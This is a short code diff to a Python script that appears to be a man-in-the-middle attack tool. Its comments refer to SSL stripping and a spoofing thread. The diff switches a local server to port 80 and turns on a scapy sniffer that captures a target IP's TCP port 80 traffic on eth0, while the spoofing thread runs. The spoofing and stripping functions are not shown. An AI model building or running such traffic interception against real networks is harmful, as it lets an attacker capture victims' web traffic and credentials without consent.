@@ -19,7 +19,7 @@ def main():
 
     # Start a Server for testing purposes
     server = Server()
-    server_thread = threading.Thread(target=server.start, args=(8000,))
+    server_thread = threading.Thread(target=server.start, args=(80,))
     server_thread.daemon = True
     server_thread.start()
 
@@ -60,10 +60,9 @@ def main():
     # capture_device = scapy.AsyncSniffer(iface="eth0", prn=ssl_strip, filter=target_filter)
     # capture_device = scapy.AsyncSniffer(iface="eth0", prn=ssl_strip, filter="tcp")
     # capture_device = scapy.AsyncSniffer(iface="eth0", prn=ssl_strip)
-    # capture_device = scapy.AsyncSniffer(iface="eth0", prn=lambda x: ssl_strip(x), filter="tcp")
-    
     # capture_device = scapy.AsyncSniffer(iface="eth0", filter=target_filter)
-    # capture_device.start()
+    capture_device = scapy.AsyncSniffer(iface="eth0", prn=lambda x: pkt_sniffer(x, target_ip), filter="tcp port 80")
+    capture_device.start()
 
     try:
         # Begin Spoofing on separate thread
@@ -76,8 +75,6 @@ def main():
 
         # Rejoin all threads to main thread
         server_thread.join()
-        # server_thread_2.join()
-        #nfqueue_thread.join()
         # server_thread_2.join()
         # nfqueue_thread.join()
         spoof_thread.join()
